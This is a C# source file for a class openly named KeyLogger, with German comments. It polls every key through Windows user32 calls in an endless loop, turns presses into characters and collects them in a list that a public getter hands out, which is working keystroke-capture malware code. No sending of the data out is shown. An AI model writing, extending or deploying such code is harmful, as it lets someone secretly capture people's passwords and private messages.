using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Threading;
using System.Text;

namespace control
{
    public static class KeyLogger
    {
        private static List<char> loggedKeys = new List<char>();

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        public static void recordKeys()
        {
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        char key = GetCharFromVirtualKey(i);
                        if (key != '\0') // Nur druckbare Zeichen hinzufügen
                        {
                            loggedKeys.Add(key);
                        }
                    }
                }
                Thread.Sleep(10); // Kleine Pause, um CPU zu schonen
            }
        }

        private static char GetCharFromVirtualKey(int virtualKey)
        {
            uint scanCode = MapVirtualKey((uint)virtualKey, 0); // MAPVK_VK_TO_VSC
            byte[] keyState = new byte[256];
            StringBuilder buffer = new StringBuilder(10);

            // Setze Shift- und Caps-Zustand im keyState
            if ((GetAsyncKeyState(0x10) & 0x8000) != 0) keyState[0x10] = 0x80; // Shift links
            if ((GetAsyncKeyState(0xA0) & 0x8000) != 0) keyState[0xA0] = 0x80; // Shift rechts
            if ((GetKeyState(0x14) & 0x0001) != 0) keyState[0x14] = 0x01; // Caps Lock

            int result = ToUnicode((uint)virtualKey, scanCode, keyState, buffer, buffer.Capacity, 0);

            if (result > 0 && buffer.Length > 0)
            {
                return buffer[0];
            }

            return '\0'; // Kein Zeichen
        }

        public static List<char> GetLoggedKeys()
        {
            return loggedKeys;
        }
    }
}
